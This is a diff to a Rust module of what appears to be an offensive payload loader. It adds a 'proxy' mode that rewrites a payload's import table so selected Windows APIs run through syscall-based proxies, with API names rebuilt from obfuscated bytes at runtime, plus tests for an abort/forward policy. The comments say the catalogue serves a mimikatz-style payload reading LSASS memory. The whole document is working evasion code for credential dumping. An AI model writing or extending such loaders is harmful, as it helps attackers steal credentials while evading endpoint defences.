@@ -12,9 +12,10 @@
 //! which is why the selection is validated against the catalogue instead of being
 //! accepted as free-form text.
 //!
-//! Phase A (this code) ships the configuration and its validation only: `mode`
-//! defaults to `none`, so the block renders nothing and no behaviour changes. See
-//! `docs/FUTURE_API_RESOLUTION.md`.
+//! `mode: proxy` rewrites the payload's IAT so catalogue hits land on the
+//! generated proxies; every other import is forwarded, or refused when
+//! `unmatched: abort`. The catalogue docs, phases and limitations live in
+//! `docs/api-resolution.md`.
 
 use serde::{Deserialize, Serialize};
 
@@ -70,14 +71,12 @@ pub enum Unmatched {
 }
 
 /// What a generated proxy does with an intercepted call.
-///
-/// What a generated proxy does with an intercepted call.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum Strategy {
     /// Call the original function (resolved dynamically, never imported).
     ///
     /// No shipped catalogue entry uses it today (see
-    /// `docs/FUTURE_API_RESOLUTION.md`): it stays available for "thick" APIs
+    /// `docs/api-resolution.md`): it stays available for "thick" APIs
     /// that cannot be re-implemented on a syscall.
     #[allow(dead_code)]
     Forward,
@@ -110,7 +109,7 @@ impl ApiEntry {
 
 /// The catalogue of APIs an operator may select.
 ///
-/// Minimal on purpose (see `docs/FUTURE_API_RESOLUTION.md`): the critical path of
+/// Minimal on purpose (see `docs/api-resolution.md`): the critical path of
 /// a mimikatz-style payload to LSASS. `NtReadVirtualMemory` already exists in the
 /// syscall layer; `NtOpenProcess` is added alongside it.
 pub const CATALOGUE: &[ApiEntry] = &[
@@ -277,9 +276,11 @@ impl ApiResolutionConfig {
 ///
 /// Emits a no-op `resolution_policy` when nothing is proxied (the execution
 /// fragment always calls it), or the selected proxies plus the policy that maps
-/// each intercepted `(module, function)` to its proxy. Every API name is rebuilt
-/// at runtime from `strings`; the names appear only in comments (stripped from
-/// the source-literal guard) and in `proxy_<index>` identifiers.
+/// each intercepted `(module, function)` to its proxy. Imports outside the
+/// catalogue resolve normally, or fail the load when `unmatched: abort`. Every
+/// API name is rebuilt at runtime from `strings`; the names appear only in
+/// comments (stripped from the source-literal guard) and in `proxy_<index>`
+/// identifiers.
 pub fn render_block(config: &ApiResolutionConfig, strings: &StringsConfig) -> String {
     if config.mode != ApiResolutionMode::Proxy || config.apis.is_empty() {
         return NOOP_BLOCK.to_string();
@@ -301,13 +302,19 @@ pub fn render_block(config: &ApiResolutionConfig, strings: &StringsConfig) -> St
         matches.push_str(&format!(
             "        {{\n            let want_module: String = {module_def};\n            let want_function: String = \
              {function_def};\n            if module == want_module.as_str() && func == \
-             want_function.as_str() {{\n                return Some(proxy_{index} as usize as u64);\n            }}\n        \
+             want_function.as_str() {{\n                return crate::ImportPolicy::Proxy(proxy_{index} as usize as u64);\n            }}\n        \
              }}\n"
         ));
     }
 
+    let miss = match config.unmatched {
+        Unmatched::Forward => "crate::ImportPolicy::Forward",
+        Unmatched::Abort => "crate::ImportPolicy::Abort",
+    };
+
     BLOCK_TEMPLATE
         .replace("$POLICY_MATCHES$", matches.trim_end())
+        .replace("$MISS_DECISION$", miss)
         .replace("$PROXIES$", proxies.trim_end())
 }
 
@@ -395,11 +402,10 @@ fn forward_proxy(
 const NOOP_BLOCK: &str = r#"// --- API resolution (build.stub.api_resolution) ---
 // No API is proxied: the loader resolves the payload's imports normally.
 mod api_resolution {
-    /// Returns the proxy address for an intercepted `(module, function)`, or
-    /// `None`. Nothing is proxied in this build.
+    /// Nothing is proxied in this build: every import is resolved normally.
     #[allow(dead_code)]
-    pub fn resolution_policy(_dll: &str, _func: &str) -> Option<u64> {
-        None
+    pub fn resolution_policy(_dll: &str, _func: &str) -> crate::ImportPolicy {
+        crate::ImportPolicy::Forward
     }
 }
 use api_resolution::resolution_policy;
@@ -411,13 +417,13 @@ const BLOCK_TEMPLATE: &str = r#"// --- API resolution (build.stub.api_resolution
 // through the syscall layer. The names are rebuilt at runtime from obfuscated
 // bytes; only the comments carry them in clear.
 mod api_resolution {
-    /// Returns the proxy address for an intercepted `(module, function)`, or
-    /// `None` to resolve it normally.
+    /// Decides how one payload import slot is served: a generated proxy, the
+    /// real export, or a refusal (`unmatched: abort`).
     #[allow(dead_code)]
-    pub fn resolution_policy(dll: &str, func: &str) -> Option<u64> {
+    pub fn resolution_policy(dll: &str, func: &str) -> crate::ImportPolicy {
         let module = normalize_module(dll);
 $POLICY_MATCHES$
-        None
+        $MISS_DECISION$
     }
 
     /// Normalizes a module name for comparison: the file-name component, a
@@ -556,7 +562,7 @@ const HANDLER_TEMPLATE: &str = r#"    /// $COMMENT$: decides what to return. Cat
                     );
                     if len > 0 {
                         let path = String::from_utf8_lossy(&buf[..len as usize]);
-                        if let Some(proxy) = resolution_policy(&path, func) {
+                        if let crate::ImportPolicy::Proxy(proxy) = resolution_policy(&path, func) {
                             crate::tech_dbg!(
                                 "api_resolution",
                                 "an intercepted resolution returned a proxy"
@@ -780,6 +786,14 @@ mod tests {
         ApiResolutionConfig::from_yaml(Some(&y)).expect("valid")
     }
 
+    fn proxy_config_with_unmatched(apis: &[&str], unmatched: &str) -> ApiResolutionConfig {
+        let list: String = apis.iter().map(|a| format!("  - \"{a}\"\n")).collect();
+        let y = yaml(&format!(
+            "mode: proxy\napis:\n{list}unmatched: {unmatched}\n"
+        ));
+        ApiResolutionConfig::from_yaml(Some(&y)).expect("valid")
+    }
+
     /// The generated code with comment lines removed (comments may name APIs).
     fn code_only(source: &str) -> String {
         source
@@ -793,6 +807,7 @@ mod tests {
     fn noop_block_when_nothing_is_proxied() {
         let block = render_block(&ApiResolutionConfig::default(), &xor_strings());
         assert!(block.contains("pub fn resolution_policy"));
+        assert!(block.contains("crate::ImportPolicy::Forward"));
         assert!(!block.contains("proxy_0"));
     }
 
@@ -803,6 +818,7 @@ mod tests {
         assert!(block.contains("proxy_0"));
         assert!(block.contains("proxy_1"));
         assert!(block.contains("fn resolution_policy"));
+        assert!(block.contains("crate::ImportPolicy::Proxy("));
         assert!(block.contains("normalize_module"));
         assert!(block.contains("crate::nt_read_vm"));
         assert!(!block.contains('$'), "unsubstituted placeholder: {block}");
@@ -839,7 +855,30 @@ mod tests {
         let block = render_block(&config, &xor_strings());
         assert!(block.contains("GetModuleFileNameA"));
         assert!(block.contains("resolution_policy(&path, func)"));
+        assert!(block.contains("crate::ImportPolicy::Proxy("));
         assert!(block.contains("original_0"));
+        assert!(!block.contains('$'), "unsubstituted placeholder: {block}");
+    }
+
+    /// `unmatched` picks the policy's miss arm: `forward` resolves normally,
+    /// `abort` returns `ImportPolicy::Abort` so the load fails (finding 1).
+    #[test]
+    fn unmatched_selects_the_miss_decision() {
+        let forward = proxy_config(&["kernel32!ReadProcessMemory"]);
+        let block = render_block(&forward, &xor_strings());
+        assert!(
+            block.contains("crate::ImportPolicy::Forward")
+                && !block.contains("ImportPolicy::Abort"),
+            "forward should be the miss arm: {block}"
+        );
+
+        let abort = proxy_config_with_unmatched(&["kernel32!ReadProcessMemory"], "abort");
+        let block = render_block(&abort, &xor_strings());
+        assert!(
+            block.contains("crate::ImportPolicy::Abort")
+                && !block.contains("ImportPolicy::Forward"),
+            "abort should be the miss arm: {block}"
+        );
         assert!(!block.contains('$'), "unsubstituted placeholder: {block}");
     }
 
